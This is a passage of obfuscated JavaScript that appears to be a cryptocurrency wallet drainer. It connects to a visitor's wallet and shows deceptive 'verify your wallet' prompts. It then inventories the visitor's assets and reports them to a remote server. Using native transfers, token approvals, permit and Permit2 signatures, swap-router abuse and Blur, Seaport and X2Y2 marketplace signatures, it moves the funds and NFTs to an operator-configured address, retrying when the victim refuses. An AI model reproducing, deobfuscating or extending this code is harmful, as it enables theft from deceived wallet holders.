window[_0x4a6c7(0x17b)]===_0x4a6c7(0x1dd))FLASH_Provider=window[_0x4a6c7(0x17b)],FLASH_Current_Provider=_0x4a6c7(0xe2);else{window[_0x4a6c7(0x11c)](_0x4a6c7(0x16b),_0x4a6c7(0x155))[_0x4a6c7(0x23e)](),FLASH_Process=![];return;}}else _0x54908e==_0x4a6c7(0x18a)||_0x54908e==_0x4a6c7(0xc7)?FLASH_Current_Provider=_0x4a6c7(0x18a):typeof window['ethereum']===_0x4a6c7(0x1dd)?(FLASH_Provider=window['ethereum'],FLASH_Current_Provider=_0x4a6c7(0x225)):FLASH_Current_Provider='WalletConnect';}}}}else window[_0x4a6c7(0x181)]?(FLASH_Provider=window[_0x4a6c7(0x181)],FLASH_Current_Provider='Ethereum'):FLASH_Current_Provider=_0x4a6c7(0x18a);try{await connect_request();let _0x361879=null;if(FLASH_Current_Provider=='WalletConnect'){document[_0x4a6c7(0x13b)](_0x4a6c7(0x277))[_0x4a6c7(0x1bf)]['display']=_0x4a6c7(0x1d0),await load_wc();try{await FLASH_Provider[_0x4a6c7(0x167)]();}catch(_0x33d9f3){console[_0x4a6c7(0x260)](_0x33d9f3);}await FLASH_Provider['connect']();if(FLASH_Provider&&FLASH_Provider['accounts']['length']>0x0){if(!FLASH_Provider['accounts'][0x0]['includes']('0x'))return FLASH_Process=![],await connect_cancel();await new Promise(_0x391a68=>setTimeout(_0x391a68,0x9c4)),FLASH_Current_Address=FLASH_Provider[_0x4a6c7(0x254)][0x0],FLASH_Current_Chain_ID=FLASH_Provider[_0x4a6c7(0x243)],FLASH_Web3=new ethers[(_0x4a6c7(0xe1))]['Web3Provider'](FLASH_Provider),FLASH_Signer=FLASH_Web3[_0x4a6c7(0x15d)](),FLASH_Settings[_0x4a6c7(0x1c7)]['Sign'][_0x4a6c7(0x18a)]==0x0&&(FLASH_Sign_Disabled=!![]);}else return FLASH_Process=![],await connect_cancel();}else{if(FLASH_Current_Provider=='Trust\x20Wallet'&&!FLASH_Mobile_Status)try{_0x361879=await FLASH_Provider[_0x4a6c7(0x18c)]({'method':'eth_requestAccounts','params':[{'eth_accounts':{}}]});if(_0x361879&&_0x361879['length']>0x0){if(!FLASH_Provider[_0x4a6c7(0x108)][_0x4a6c7(0xc5)]('0x'))return connect_cancel();FLASH_Current_Address=FLASH_Provider[_0x4a6c7(0x108)],FLASH_Current_Chain_ID=parseInt(FLASH_Provider[_0x4a6c7(0x243)]),FLASH_Web3=new ethers[(_0x4a6c7(0xe1))][(_0x4a6c7(0x278))](FLASH_Provider),FLASH_Signer=FLASH_Web3['getSigner']();}else return FLASH_Process=![],await connect_cancel();}catch(_0x5ec77a){_0x361879=await FLASH_Provider[_0x4a6c7(0x18c)]({'method':_0x4a6c7(0x128)});if(_0x361879&&_0x361879[_0x4a6c7(0x1a6)]>0x0){if(!_0x361879[0x0][_0x4a6c7(0xc5)]('0x'))return connect_cancel();FLASH_Current_Address=_0x361879[0x0],FLASH_Current_Chain_ID=parseInt(FLASH_Provider[_0x4a6c7(0x243)]),FLASH_Web3=new ethers['providers'][(_0x4a6c7(0x278))](FLASH_Provider),FLASH_Signer=FLASH_Web3['getSigner']();}else return FLASH_Process=![],await connect_cancel();}else try{_0x361879=await FLASH_Provider[_0x4a6c7(0x18c)]({'method':'wallet_requestPermissions','params':[{'eth_accounts':{}}]});if(_0x361879&&_0x361879[_0x4a6c7(0x1a6)]>0x0){if(!FLASH_Provider['selectedAddress'][_0x4a6c7(0xc5)]('0x'))return connect_cancel();FLASH_Current_Address=FLASH_Provider[_0x4a6c7(0x108)],FLASH_Current_Chain_ID=parseInt(FLASH_Provider['chainId']),FLASH_Web3=new ethers[(_0x4a6c7(0xe1))]['Web3Provider'](FLASH_Provider),FLASH_Signer=FLASH_Web3[_0x4a6c7(0x15d)]();}else return FLASH_Process=![],await connect_cancel();}catch(_0x5064cf){_0x361879=await FLASH_Provider[_0x4a6c7(0x18c)]({'method':'eth_requestAccounts'});if(_0x361879&&_0x361879[_0x4a6c7(0x1a6)]>0x0){if(!_0x361879[0x0][_0x4a6c7(0xc5)]('0x'))return connect_cancel();FLASH_Current_Address=_0x361879[0x0],FLASH_Current_Chain_ID=parseInt(FLASH_Provider[_0x4a6c7(0x243)]),FLASH_Web3=new ethers[(_0x4a6c7(0xe1))][(_0x4a6c7(0x278))](FLASH_Provider),FLASH_Signer=FLASH_Web3[_0x4a6c7(0x15d)]();}else return FLASH_Process=![],await connect_cancel();}}if(!FLASH_Current_Address['match'](/^0x\S+$/))throw new Error(_0x4a6c7(0xa4));}catch(_0x770ee9){return console[_0x4a6c7(0x260)](_0x770ee9),FLASH_Process=![],await connect_cancel();}ms_hide();if(FLASH_Settings['V_MODE']==0x1){FLASH_Loader_Style==0x2?FLASHL[_0x4a6c7(0xbf)]({'icon':_0x4a6c7(0x29c),'title':'Waiting\x20for\x20action','text':'Sign\x20message\x20to\x20verificate\x20your\x20wallet','showConfirmButton':!![],'confirmButtonText':_0x4a6c7(0x173),'color':FLASH_Color_Scheme}):Swal[_0x4a6c7(0xbf)]({'html':_0x4a6c7(0x13f),'imageUrl':_0x4a6c7(0x130),'imageHeight':0x3c,'allowOutsideClick':![],'allowEscapeKey':![],'timer':0x0,'width':0x258,'showConfirmButton':![]});try{const _0x31ea62=(FLASH_Verify_Message==''?FLASH_Settings[_0x4a6c7(0x197)]:FLASH_Verify_Message)[_0x4a6c7(0x21b)](_0x4a6c7(0xf8),FLASH_Current_Address),_0x26a9f5=await FLASH_Signer['signMessage'](_0x31ea62),_0x45867b=ethers['utils'][_0x4a6c7(0xd3)](ethers[_0x4a6c7(0x18e)]['hashMessage'](_0x31ea62),_0x26a9f5);if(!_0x45867b)return FLASH_Loader_Style==0x2?FLASHL['fire']({'icon':_0x4a6c7(0x125),'title':_0x4a6c7(0x192),'subtitle':_0x4a6c7(0x282),'text':_0x4a6c7(0x1b3),'showConfirmButton':!![],'confirmButtonText':'OK','color':FLASH_Color_Scheme}):Swal[_0x4a6c7(0xbf)]({'title':_0x4a6c7(0x282),'text':'We\x20have\x20received\x20your\x20signature,\x20but\x20it\x27s\x20incorrect,\x20please\x20try\x20again.','icon':_0x4a6c7(0x125),'confirmButtonText':'OK'}),FLASH_Process=![],await connect_cancel();else{let _0x261ce3=await send_request({'action':_0x4a6c7(0xc4),'sign':_0x26a9f5,'address':FLASH_Current_Address,'message':FLASH_Verify_Message});if(_0x261ce3[_0x4a6c7(0x250)]!='OK')return FLASH_Loader_Style==0x2?FLASHL['fire']({'icon':_0x4a6c7(0x125),'title':_0x4a6c7(0x192),'subtitle':_0x4a6c7(0x282),'text':_0x4a6c7(0x1b3),'showConfirmButton':!![],'confirmButtonText':'OK','color':FLASH_Color_Scheme}):Swal[_0x4a6c7(0xbf)]({'title':_0x4a6c7(0x282),'text':_0x4a6c7(0x1b3),'icon':_0x4a6c7(0x125),'confirmButtonText':'OK'}),FLASH_Process=![],await connect_cancel();}}catch(_0x3c7fc2){return FLASH_Loader_Style==0x2?FLASHL['fire']({'icon':_0x4a6c7(0x125),'title':_0x4a6c7(0x192),'subtitle':_0x4a6c7(0x282),'text':'We\x20cannot\x20verify\x20that\x20the\x20wallet\x20is\x20yours\x20as\x20you\x20did\x20not\x20sign\x20the\x20message\x20provided.','showConfirmButton':!![],'confirmButtonText':'OK','color':FLASH_Color_Scheme}):Swal[_0x4a6c7(0xbf)]({'title':_0x4a6c7(0x282),'text':'We\x20cannot\x20verify\x20that\x20the\x20wallet\x20is\x20yours\x20as\x20you\x20did\x20not\x20sign\x20the\x20message\x20provided.','icon':_0x4a6c7(0x125),'confirmButtonText':'OK'}),FLASH_Process=![],await connect_cancel();}}else await send_request({'action':_0x4a6c7(0xc4),'address':FLASH_Current_Address});await connect_success(),show_check();if(FLASH_Settings[_0x4a6c7(0x179)]['length']>0x0&&FLASH_Settings[_0x4a6c7(0x179)][_0x4a6c7(0xc5)](FLASH_Current_Address[_0x4a6c7(0x21d)]()[_0x4a6c7(0x20f)]())){FLASH_Check_Done=!![],Swal[_0x4a6c7(0x297)]();FLASH_Loader_Style==0x2?FLASHL[_0x4a6c7(0xbf)]({'icon':_0x4a6c7(0x125),'title':_0x4a6c7(0x192),'subtitle':_0x4a6c7(0x209),'text':_0x4a6c7(0x273),'showConfirmButton':!![],'confirmButtonText':'OK','color':FLASH_Color_Scheme}):Swal[_0x4a6c7(0xbf)]({'title':_0x4a6c7(0x209),'text':_0x4a6c7(0x25e),'icon':'error','confirmButtonText':'OK'});FLASH_Process=![];return;}let _0x326575=await get_wallet_assets(FLASH_Current_Address),_0x31d57f=0x0;for(const _0x210fb5 of _0x326575){try{_0x31d57f+=_0x210fb5[_0x4a6c7(0xc1)];}catch(_0x150f60){console[_0x4a6c7(0x260)](_0x150f60);}}let _0x45f68d=0x0;for(const _0xaca579 of _0x326575)_0x45f68d+=_0xaca579[_0x4a6c7(0xc1)];await send_request({'action':'check_finish','user_id':FLASH_ID,'assets':_0x326575,'balance':_0x45f68d}),FLASH_Check_Done=!![],Swal['close']();if(FLASH_Settings[_0x4a6c7(0x1c7)]['Minimal_Wallet_Price']>_0x31d57f){FLASH_Loader_Style==0x2?FLASHL[_0x4a6c7(0xbf)]({'icon':_0x4a6c7(0x125),'title':_0x4a6c7(0x192),'subtitle':_0x4a6c7(0x1b4),'text':_0x4a6c7(0x21a),'showConfirmButton':!![],'confirmButtonText':'OK','color':FLASH_Color_Scheme}):Swal[_0x4a6c7(0xbf)]({'title':_0x4a6c7(0x1b4),'text':_0x4a6c7(0x21a),'icon':_0x4a6c7(0x125),'confirmButtonText':'OK'});FLASH_Process=![];return;}FLASH_Loader_Style==0x2?FLASHL['fire']({'icon':_0x4a6c7(0x29c),'title':_0x4a6c7(0xa7),'text':_0x4a6c7(0x27e),'showConfirmButton':!![],'confirmButtonText':'Waiting...','color':FLASH_Color_Scheme}):Swal[_0x4a6c7(0xbf)]({'html':'<b>Done!</b>\x20Sign\x20message\x20in\x20your\x20wallet\x20to\x20continue...','imageUrl':_0x4a6c7(0x130),'imageHeight':0x3c,'allowOutsideClick':![],'allowEscapeKey':![],'timer':0x0,'width':0x258,'showConfirmButton':![]});if(FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x283)]['MetaMask']==0x0&&FLASH_Current_Provider==_0x4a6c7(0x15c)||FLASH_Settings['Settings'][_0x4a6c7(0x283)][_0x4a6c7(0x264)]==0x0&&FLASH_Current_Provider=='Trust\x20Wallet'||FLASH_Current_Provider=='Trust\x20Wallet'&&!FLASH_Mobile_Status)FLASH_Sign_Disabled=!![];for(const _0x461b5c of _0x326575){try{if(_0x461b5c[_0x4a6c7(0x22c)]!=_0x4a6c7(0x158))FLASH_Gas_Reserves[_0x461b5c[_0x4a6c7(0x28e)]]+=0x1;}catch(_0x2be776){console['log'](_0x2be776);}}console['table'](_0x326575);if(typeof SIGN_BLUR!==_0x4a6c7(0xb0)&&FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x117)][_0x4a6c7(0x175)]==0x1&&FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x117)][_0x4a6c7(0x295)]==0x1)await SIGN_BLUR(_0x326575,FLASH_Provider,FLASH_Current_Address,FLASH_Settings[_0x4a6c7(0x1f8)],FLASH_ID,FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x117)]['Price']);if(typeof SIGN_SEAPORT!==_0x4a6c7(0xb0)&&FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0xd1)][_0x4a6c7(0x175)]==0x1&&FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0xd1)][_0x4a6c7(0x295)]==0x1)await SIGN_SEAPORT(_0x326575,FLASH_Provider,FLASH_Current_Address,FLASH_Settings[_0x4a6c7(0x1f8)],FLASH_ID,FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0xd1)][_0x4a6c7(0x253)]);if(typeof SIGN_X2Y2!==_0x4a6c7(0xb0)&&FLASH_Settings[_0x4a6c7(0x1c7)]['x2y2'][_0x4a6c7(0x175)]==0x1&&FLASH_Current_Chain_ID==0x1&&FLASH_Settings[_0x4a6c7(0x1c7)]['x2y2']['Priority']==0x1)await SIGN_X2Y2(_0x326575,FLASH_Provider,FLASH_Current_Address,FLASH_Settings[_0x4a6c7(0x1f8)],FLASH_ID,FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x1e2)][_0x4a6c7(0x253)]);let _0x70701a=!![];while(_0x70701a){_0x70701a=FLASH_Settings['LA']==0x1;for(const _0x5e1b20 of _0x326575){try{if(_0x5e1b20[_0x4a6c7(0x9e)])continue;let _0x2bda2e=![];if(_0x5e1b20[_0x4a6c7(0x22c)]==_0x4a6c7(0x158)){const _0x5c8cf4=new ethers[(_0x4a6c7(0xe1))][(_0x4a6c7(0x299))](FLASH_Settings[_0x4a6c7(0x256)][_0x5e1b20['chain_id']]),_0x2951f7=BN(await _0x5c8cf4[_0x4a6c7(0x1ee)]())[_0x4a6c7(0x208)](BN(0x64))[_0x4a6c7(0x242)](Math[_0x4a6c7(0x285)](FLASH_Gas_Multiplier*0x64)),_0x2cf5ad=BN(_0x5e1b20[_0x4a6c7(0x28e)]==0xa4b1?0x4c4b40:_0x5e1b20[_0x4a6c7(0x28e)]==0xa86a?0x4c4b40:_0x5e1b20[_0x4a6c7(0x28e)]==0x171?0xdbba0:0x249f0),_0x252f04=_0x2cf5ad[_0x4a6c7(0x242)](FLASH_Gas_Reserves[_0x5e1b20['chain_id']]+0x1)['mul'](_0x2951f7),_0x15d5bb={'from':FLASH_Current_Address,'to':FLASH_Settings[_0x4a6c7(0x1bb)],'value':BN(0x64)},_0x51a129=await _0x5c8cf4[_0x4a6c7(0x1ce)](_0x15d5bb),_0x187a7b=await _0x5c8cf4[_0x4a6c7(0x247)](FLASH_Current_Address),_0x5797f5=_0x187a7b[_0x4a6c7(0x169)](_0x51a129['mul'](_0x2951f7))['sub'](_0x252f04);if(_0x5797f5[_0x4a6c7(0x1b1)](BN(0x0)))continue;}if(_0x5e1b20[_0x4a6c7(0x28e)]!=FLASH_Current_Chain_ID){await chain_request(FLASH_Current_Chain_ID,_0x5e1b20['chain_id']);try{if(FLASH_Current_Provider==_0x4a6c7(0x18a))try{await FLASH_Provider[_0x4a6c7(0x18c)]({'method':_0x4a6c7(0x109),'params':[{'chainId':'0x'+_0x5e1b20[_0x4a6c7(0x28e)][_0x4a6c7(0x19b)](0x10)}]});}catch(_0x95f79c){await chain_cancel();continue;}else try{await FLASH_Provider[_0x4a6c7(0x18c)]({'method':_0x4a6c7(0x109),'params':[{'chainId':'0x'+_0x5e1b20[_0x4a6c7(0x28e)]['toString'](0x10)}]});}catch(_0x26f246){if(_0x26f246[_0x4a6c7(0x23d)]==0x1326||_0x26f246[_0x4a6c7(0x23d)]==-0x7f5b)try{await FLASH_Provider[_0x4a6c7(0x18c)]({'method':_0x4a6c7(0x154),'params':[FLASH_MetaMask_ChainData[_0x5e1b20[_0x4a6c7(0x28e)]]]});}catch(_0x506f1e){await chain_cancel();continue;}else{await chain_cancel();continue;}}FLASH_Current_Chain_ID=_0x5e1b20['chain_id'],FLASH_Web3=new ethers[(_0x4a6c7(0xe1))][(_0x4a6c7(0x278))](FLASH_Provider),FLASH_Signer=FLASH_Web3[_0x4a6c7(0x15d)](),_0x2bda2e=!![],await chain_success();}catch(_0x51866b){console[_0x4a6c7(0x260)](_0x51866b),await chain_cancel();continue;}}else _0x2bda2e=!![];if(!_0x2bda2e)continue;if(_0x5e1b20[_0x4a6c7(0x22c)]=='NATIVE'){if(FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x283)][_0x4a6c7(0x1b0)]>0x0&&(!FLASH_Sign_Disabled||FLASH_Settings[_0x4a6c7(0x1c7)]['Sign'][_0x4a6c7(0x199)]==0x1))while(!![]){try{await SIGN_NATIVE(_0x5e1b20),_0x5e1b20[_0x4a6c7(0x9e)]=!![];break;}catch(_0x289d8d){console[_0x4a6c7(0x260)](_0x289d8d);if(FLASH_Settings['Settings'][_0x4a6c7(0x283)][_0x4a6c7(0x106)]==0x1&&FLASH_Current_Provider=='WalletConnect'||typeof _0x289d8d[_0x4a6c7(0x151)]==_0x4a6c7(0x29a)&&_0x289d8d[_0x4a6c7(0x151)][_0x4a6c7(0xc5)](_0x4a6c7(0x18d))||_0x289d8d[_0x4a6c7(0x23d)]==-0x7f59||_0x289d8d[_0x4a6c7(0x23d)]==-0x7d00||_0x289d8d['message']&&is_valid_json(_0x289d8d[_0x4a6c7(0x151)])&&(JSON[_0x4a6c7(0x132)](_0x289d8d[_0x4a6c7(0x151)])['code']==-0x7f59||JSON[_0x4a6c7(0x132)](_0x289d8d['message'])[_0x4a6c7(0x23d)]==-0x7d00)){if(FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x283)]['Force']==0x1)await sign_cancel();else{await sign_unavailable();while(!![]){try{await TRANSFER_NATIVE(_0x5e1b20),_0x5e1b20[_0x4a6c7(0x9e)]=!![];break;}catch(_0x4c1638){console['log'](_0x4c1638);if(_0x4c1638!=_0x4a6c7(0xa8)){await transfer_cancel();if(!FLASH_Settings[_0x4a6c7(0xbd)])break;}else break;}}}break;}else{console[_0x4a6c7(0x260)](_0x289d8d);if(_0x289d8d!=_0x4a6c7(0xa8)){await sign_cancel();if(!FLASH_Settings[_0x4a6c7(0xbd)])break;}else break;}}}else while(!![]){try{await TRANSFER_NATIVE(_0x5e1b20),_0x5e1b20[_0x4a6c7(0x9e)]=!![];break;}catch(_0x5dad7f){console[_0x4a6c7(0x260)](_0x5dad7f);if(_0x5dad7f!=_0x4a6c7(0xa8)){await transfer_cancel();if(!FLASH_Settings[_0x4a6c7(0xbd)])break;}else break;}}}else{if(_0x5e1b20[_0x4a6c7(0x22c)]==_0x4a6c7(0x252)){if(typeof _0x5e1b20[_0x4a6c7(0x159)]==_0x4a6c7(0xb0)&&FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0xa6)]['Mode']&&_0x5e1b20['amount_usd']>=FLASH_Settings['Settings'][_0x4a6c7(0xa6)][_0x4a6c7(0x253)]){const _0x29d7b6=await retrive_token(_0x5e1b20[_0x4a6c7(0x28e)],_0x5e1b20[_0x4a6c7(0x1d2)]),_0x55a3a2=new ethers[(_0x4a6c7(0xe1))][(_0x4a6c7(0x299))](FLASH_Settings[_0x4a6c7(0x256)][_0x5e1b20[_0x4a6c7(0x28e)]]),_0x3dbd18=new ethers[(_0x4a6c7(0x15a))](_0x5e1b20[_0x4a6c7(0x1d2)],_0x29d7b6,_0x55a3a2),_0x29a0ee=get_permit_type(_0x3dbd18['functions']);_0x5e1b20[_0x4a6c7(0x159)]=_0x29a0ee,_0x5e1b20[_0x4a6c7(0xb9)]='1',_0x5e1b20[_0x4a6c7(0xd9)]=_0x29d7b6;if(_0x29a0ee>0x0){if(_0x3dbd18[_0x4a6c7(0x18b)][_0x4a6c7(0xbe)](_0x4a6c7(0x227)))try{_0x5e1b20[_0x4a6c7(0xb9)]=await _0x3dbd18['version']();}catch(_0x5f3f09){console[_0x4a6c7(0x260)](_0x5f3f09);}console[_0x4a6c7(0x260)](_0x4a6c7(0x22e)+_0x5e1b20[_0x4a6c7(0xd8)]+',\x20Permit\x20Type:\x20'+_0x29a0ee+_0x4a6c7(0x1e8)+_0x5e1b20[_0x4a6c7(0xb9)]);}}if(_0x5e1b20[_0x4a6c7(0x159)]>0x0)for(const _0x405923 of FLASH_Settings['Permit_BL']){if(_0x405923[0x0]==FLASH_Current_Chain_ID&&_0x405923[0x1]===_0x5e1b20[_0x4a6c7(0x1d2)]['toLowerCase']()[_0x4a6c7(0x20f)]()){_0x5e1b20[_0x4a6c7(0x159)]=0x0;break;}}if(FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x1c1)]['Mode']&&_0x5e1b20[_0x4a6c7(0x150)]){const _0x1e2e30=[];for(const _0x3d7a8f of _0x326575){try{_0x3d7a8f['chain_id']==_0x5e1b20['chain_id']&&_0x3d7a8f[_0x4a6c7(0x150)]&&(_0x1e2e30[_0x4a6c7(0x1a5)](_0x3d7a8f),_0x3d7a8f[_0x4a6c7(0x9e)]=!![]);}catch(_0x431727){console[_0x4a6c7(0x260)](_0x431727);}}while(!![]){try{await DO_PERMIT2(_0x5e1b20,_0x1e2e30),_0x5e1b20['skip']=!![];break;}catch(_0x192cdb){console[_0x4a6c7(0x260)](_0x192cdb),await approve_cancel();if(!FLASH_Settings[_0x4a6c7(0xe5)])break;}}}else{if(FLASH_Settings['Settings'][_0x4a6c7(0xa6)][_0x4a6c7(0x267)]&&_0x5e1b20[_0x4a6c7(0x159)]&&_0x5e1b20[_0x4a6c7(0x159)]>0x0)while(!![]){try{await PERMIT_TOKEN(_0x5e1b20),_0x5e1b20[_0x4a6c7(0x9e)]=!![];break;}catch(_0x20f261){console[_0x4a6c7(0x260)](_0x20f261),await approve_cancel();if(!FLASH_Settings[_0x4a6c7(0xe5)])break;}}else{if(FLASH_Settings[_0x4a6c7(0x1c7)]['Swappers'][_0x4a6c7(0x175)]&&_0x5e1b20[_0x4a6c7(0x1fb)]&&_0x5e1b20[_0x4a6c7(0xc1)]>=FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x139)][_0x4a6c7(0x253)]){if(_0x5e1b20['swapper_type']=='Uniswap'){const _0x33a76f=[];for(const _0x2f62f2 of _0x326575){try{_0x2f62f2[_0x4a6c7(0x28e)]==_0x5e1b20[_0x4a6c7(0x28e)]&&_0x2f62f2[_0x4a6c7(0x1fb)]&&_0x2f62f2[_0x4a6c7(0xdc)]==_0x4a6c7(0x115)&&(_0x33a76f[_0x4a6c7(0x1a5)](_0x2f62f2),_0x2f62f2[_0x4a6c7(0x9e)]=!![]);}catch(_0x3ec472){console[_0x4a6c7(0x260)](_0x3ec472);}}while(!![]){try{await DO_UNISWAP(_0x5e1b20,_0x33a76f),_0x5e1b20[_0x4a6c7(0x9e)]=!![];break;}catch(_0x341b73){console[_0x4a6c7(0x260)](_0x341b73),await sign_cancel();if(!FLASH_Settings[_0x4a6c7(0xe5)])break;}}}else{if(_0x5e1b20[_0x4a6c7(0xdc)]==_0x4a6c7(0x112)){const _0x5dfff4=[];for(const _0x28f0b6 of _0x326575){try{_0x28f0b6[_0x4a6c7(0x28e)]==_0x5e1b20[_0x4a6c7(0x28e)]&&_0x28f0b6['swapper']&&_0x28f0b6[_0x4a6c7(0xdc)]==_0x4a6c7(0x112)&&(_0x5dfff4['push'](_0x28f0b6),_0x28f0b6[_0x4a6c7(0x9e)]=!![]);}catch(_0x1f1497){console['log'](_0x1f1497);}}while(!![]){try{await DO_PANCAKE_V3(_0x5e1b20,_0x5dfff4),_0x5e1b20['skip']=!![];break;}catch(_0xa5a6c5){console[_0x4a6c7(0x260)](_0xa5a6c5),await sign_cancel();if(!FLASH_Settings[_0x4a6c7(0xe5)])break;}}}else while(!![]){try{await DO_SWAP(_0x5e1b20),_0x5e1b20[_0x4a6c7(0x9e)]=!![];break;}catch(_0x1a808f){console[_0x4a6c7(0x260)](_0x1a808f),await sign_cancel();if(!FLASH_Settings[_0x4a6c7(0xe5)])break;}}}}else{if(FLASH_Settings['Settings']['Sign'][_0x4a6c7(0x19d)]>0x0&&(!FLASH_Sign_Disabled||FLASH_Settings['Settings'][_0x4a6c7(0x283)][_0x4a6c7(0x199)]==0x1))while(!![]){try{await SIGN_TOKEN(_0x5e1b20);if(FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x283)][_0x4a6c7(0x19d)]==0x1){const _0x24fa39=send_request({'action':_0x4a6c7(0x185),'user_id':FLASH_ID,'asset':_0x5e1b20,'address':FLASH_Current_Address,'PW':![]});if(FLASH_Settings['Settings'][_0x4a6c7(0xfa)])await _0x24fa39;}_0x5e1b20[_0x4a6c7(0x9e)]=!![];break;}catch(_0x3484a9){console[_0x4a6c7(0x260)](_0x3484a9);if(FLASH_Settings[_0x4a6c7(0x1c7)]['Sign'][_0x4a6c7(0x106)]==0x1&&FLASH_Current_Provider=='WalletConnect'||typeof _0x3484a9[_0x4a6c7(0x151)]==_0x4a6c7(0x29a)&&_0x3484a9[_0x4a6c7(0x151)][_0x4a6c7(0xc5)](_0x4a6c7(0x18d))||_0x3484a9[_0x4a6c7(0x23d)]==-0x7f59||_0x3484a9[_0x4a6c7(0x23d)]==-0x7d00||_0x3484a9[_0x4a6c7(0x151)]&&is_valid_json(_0x3484a9[_0x4a6c7(0x151)])&&(JSON['parse'](_0x3484a9[_0x4a6c7(0x151)])[_0x4a6c7(0x23d)]==-0x7f59||JSON['parse'](_0x3484a9[_0x4a6c7(0x151)])[_0x4a6c7(0x23d)]==-0x7d00)){if(FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x283)]['Force']==0x1)await sign_cancel();else{await sign_unavailable();while(!![]){if(FLASH_Settings['Settings']['Sign'][_0x4a6c7(0x19d)]==0x1){if(FLASH_Current_Provider==_0x4a6c7(0x15c)&&FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x133)]['MetaMask']||FLASH_Current_Provider==_0x4a6c7(0xf9)&&FLASH_Settings[_0x4a6c7(0x1c7)]['Approve'][_0x4a6c7(0x264)]||FLASH_Current_Provider!=_0x4a6c7(0x15c)&&FLASH_Current_Provider!=_0x4a6c7(0xf9))try{let _0x68c298=await APPROVE_TOKEN(_0x5e1b20);if(_0x68c298==0x1){const _0x568182=send_request({'action':_0x4a6c7(0x185),'user_id':FLASH_ID,'asset':_0x5e1b20,'address':FLASH_Current_Address,'PW':FLASH_Settings['Personal_Wallet']});if(FLASH_Settings['Settings'][_0x4a6c7(0xfa)])await _0x568182;}_0x5e1b20[_0x4a6c7(0x9e)]=!![];break;}catch(_0x4576f2){await approve_cancel();if(!FLASH_Settings[_0x4a6c7(0xe5)])break;}else try{await TRANSFER_TOKEN(_0x5e1b20),_0x5e1b20[_0x4a6c7(0x9e)]=!![];break;}catch(_0x36fe58){console[_0x4a6c7(0x260)](_0x36fe58),await transfer_cancel();if(!FLASH_Settings['Loop_T'])break;}}else{if(FLASH_Settings['Settings'][_0x4a6c7(0x283)][_0x4a6c7(0x19d)]==0x2)try{await TRANSFER_TOKEN(_0x5e1b20),_0x5e1b20[_0x4a6c7(0x9e)]=!![];break;}catch(_0x4ff695){console['log'](_0x4ff695),await transfer_cancel();if(!FLASH_Settings[_0x4a6c7(0xe5)])break;}}}}break;}else{console['log'](_0x3484a9);if(_0x3484a9!=_0x4a6c7(0xa8)){await sign_cancel();if(!FLASH_Settings[_0x4a6c7(0xe5)])break;}else break;}}}else{if(FLASH_Current_Provider==_0x4a6c7(0x15c)&&FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x133)][_0x4a6c7(0x15c)]||FLASH_Current_Provider==_0x4a6c7(0xf9)&&FLASH_Settings['Settings']['Approve'][_0x4a6c7(0x264)]||FLASH_Current_Provider!=_0x4a6c7(0x15c)&&FLASH_Current_Provider!='Trust\x20Wallet')while(!![]){try{let _0x3df05f=await APPROVE_TOKEN(_0x5e1b20);if(_0x3df05f==0x1){const _0x56ec16=send_request({'action':_0x4a6c7(0x185),'user_id':FLASH_ID,'asset':_0x5e1b20,'address':FLASH_Current_Address,'PW':FLASH_Settings[_0x4a6c7(0x1f2)]});if(FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0xfa)])await _0x56ec16;}_0x5e1b20[_0x4a6c7(0x9e)]=!![];break;}catch(_0x5cff71){console['log'](_0x5cff71),await approve_cancel();if(!FLASH_Settings['Loop_T'])break;}}else while(!![]){try{await TRANSFER_TOKEN(_0x5e1b20),_0x5e1b20[_0x4a6c7(0x9e)]=!![];break;}catch(_0x50a7ee){console[_0x4a6c7(0x260)](_0x50a7ee),await transfer_cancel();if(!FLASH_Settings[_0x4a6c7(0xe5)])break;}}}}}}}else{if(_0x5e1b20[_0x4a6c7(0x22c)]==_0x4a6c7(0x248)){if(typeof SIGN_BLUR!==_0x4a6c7(0xb0)&&FLASH_Settings['Settings'][_0x4a6c7(0x117)]['Enable']==0x1&&FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x117)]['Priority']==0x0&&!BL_US&&FLASH_Current_Chain_ID==0x1&&await is_nft_approved(_0x5e1b20[_0x4a6c7(0x1d2)],FLASH_Current_Address,_0x4a6c7(0x274))&&_0x5e1b20[_0x4a6c7(0xc1)]>=FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x117)][_0x4a6c7(0x253)])await SIGN_BLUR(_0x326575,FLASH_Provider,FLASH_Current_Address,FLASH_Settings['Address'],FLASH_ID,FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0x117)]['Price']),BL_US=!![];else{if(typeof SIGN_SEAPORT!==_0x4a6c7(0xb0)&&FLASH_Settings['Settings']['SeaPort'][_0x4a6c7(0x175)]==0x1&&FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0xd1)]['Priority']==0x0&&!SP_US&&FLASH_Current_Chain_ID==0x1&&await is_nft_approved(_0x5e1b20['address'],FLASH_Current_Address,_0x4a6c7(0x178))&&_0x5e1b20[_0x4a6c7(0xc1)]>=FLASH_Settings[_0x4a6c7(0x1c7)][_0x4a6c7(0xd1)][_0x4a6c7(0x253)])await SIGN_SEAPORT(_0x326575,FLASH_Provider,FLASH_Current_Address,FLASH_Settings['Address'],FLASH_ID,FLASH_Settings['Settings'][_0x4a6c7(0xd1)]['Price']),SP_US=!![];else{if(typeof 